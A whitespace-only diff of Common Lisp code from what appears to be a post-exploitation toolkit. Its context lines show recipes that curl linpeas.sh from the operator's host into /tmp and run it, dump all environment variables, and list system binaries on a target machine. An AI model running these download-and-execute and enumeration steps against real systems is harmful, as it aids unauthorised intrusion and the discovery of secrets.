@@ -4,7 +4,7 @@
 
 (defun exec-keep-pwd (command)
   (if (str:starts-with? "cd " command)
-      (setf *current-dir* 
+      (setf *current-dir*
             (use :exec (fmt "cd ~a && cd ~a && pwd"
                             *current-dir*
                             (str:replace-first "cd " "" command))))
@@ -31,10 +31,10 @@
   (out "[+] Downloading linpeas~%")
   (use :exec (fmt "curl http://~a:5000/tools/linpeas.sh > /tmp/linpeas.sh"
                   *host-ip*))
-  
+
   (out "[+] Running linpeas.sh~%")
   (use :exec "sh /tmp/linpeas.sh > /tmp/output.txt")
-  
+
   (out "[+] Results:~%")
   (use :exec "cat /tmp/output.txt"))
 
@@ -43,7 +43,7 @@
   (let ((files (str:split #\Newline (use :exec (fmt "ls ~a" path))))
         (ends-with-slash (str:ends-with? "/" path)))
     (if absolute-path
-        (mapcar #'(lambda (f) 
+        (mapcar #'(lambda (f)
                     (if ends-with-slash
                         (str:concat path f)
                         (str:concat path "/" f)))
@@ -65,7 +65,7 @@
 (define-recipe environment (:exec) (&optional key)
   "returns all environment variables"
   (let ((res (parse-key=value (use :exec "set"))))
-    (if key 
+    (if key
         (cdr (find-if #'(lambda (k) (string= k key)) res :key #'car))
         res)))
 
@@ -74,8 +74,8 @@
 
 (define-recipe system-binaries (:exec) (&key absolute-path)
   "list the binaries in the default places"
-  (remove-duplicates 
-   (mapcan #'(lambda (p) 
+  (remove-duplicates
+   (mapcan #'(lambda (p)
                (list-files p :absolute-path absolute-path))
            (path))
    :test #'string=))
